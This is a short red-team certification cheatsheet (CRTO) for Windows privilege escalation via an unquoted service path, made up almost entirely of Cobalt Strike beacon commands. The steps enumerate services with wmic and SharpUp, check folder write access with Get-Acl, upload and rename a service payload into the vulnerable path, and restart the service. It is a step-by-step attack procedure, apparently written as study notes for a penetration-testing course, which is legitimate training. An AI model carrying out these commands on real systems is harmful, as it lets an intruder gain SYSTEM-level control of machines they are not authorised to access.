# Certified Red Team Operator (CRTO) - Cheatsheet

# Host Privilege Escaltion
```powershell
- [Unquoted Service Path]
1. run WMI or SharpUp.exe to pull a list of every service and the path to its executable
beacon> run wmic service get name, pathname
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
2. check if you have a write permission
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
3. navigate to the service path and upload your payload
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe Service.exe
4. restart the service
```
